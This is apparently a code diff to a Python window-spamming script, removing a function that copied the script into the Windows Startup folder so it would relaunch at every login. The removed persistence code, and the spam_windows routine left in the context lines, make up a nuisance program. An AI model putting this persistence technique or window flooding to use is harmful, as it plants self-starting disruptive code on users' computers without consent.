@@ -42,27 +42,6 @@ def create_window():
     
     return window
 
-def copy_to_startup():
-    """Copy this script to the startup folder"""
-    try:
-        # Get the startup folder path
-        startup_folder = os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
-        
-        # Get current script path
-        current_script = os.path.abspath(__file__)
-        
-        # Target path in startup folder
-        target_path = os.path.join(startup_folder, 'horher_launcher.py')
-        
-        # Only copy if it doesn't already exist to avoid overwriting
-        if not os.path.exists(target_path):
-            shutil.copy2(current_script, target_path)
-            print(f"Script copied to startup: {target_path}")
-        else:
-            print("Script already exists in startup folder")
-            
-    except Exception as e:
-        print(f"Failed to copy to startup: {e}")
 
 def spam_windows():
     """Continuously create new windows"""
@@ -81,6 +60,4 @@ def main():
     root.mainloop()
 
 if __name__ == "__main__":
-    # Copy to startup folder immediately on launch
-    copy_to_startup()
     main()
